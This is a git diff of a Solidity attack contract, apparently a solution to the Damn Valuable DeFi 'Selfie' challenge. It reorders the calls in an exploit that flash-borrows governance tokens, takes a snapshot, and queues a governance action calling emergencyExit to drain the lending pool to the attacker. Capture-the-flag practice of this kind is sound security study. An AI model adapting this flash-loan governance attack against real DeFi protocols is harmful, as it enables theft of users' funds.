@@ -24,12 +24,7 @@ contract FlashBorrowerAttack is IERC3156FlashBorrower {
         uint256 fee,
         bytes calldata data
     ) external returns (bytes32) {
-        //
         DamnValuableTokenSnapshot(token).snapshot();
-
-        actionId = simpleGovernance.queueAction(address(selfiePool), 0, data);
-
-        ERC20Snapshot(token).approve(address(selfiePool), amount);
 
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
@@ -37,12 +32,16 @@ contract FlashBorrowerAttack is IERC3156FlashBorrower {
     function attack() external {
         uint256 _amount = 1500000 * 1e18;
 
+        ERC20Snapshot(selfiePool.token()).approve(address(selfiePool), _amount);
+
         bytes memory _data = abi.encodeWithSignature(
             "emergencyExit(address)",
             msg.sender
         );
 
         selfiePool.flashLoan(this, address(selfiePool.token()), _amount, _data);
+
+        actionId = simpleGovernance.queueAction(address(selfiePool), 0, _data);
     }
 
     function attack_DELAY() external {
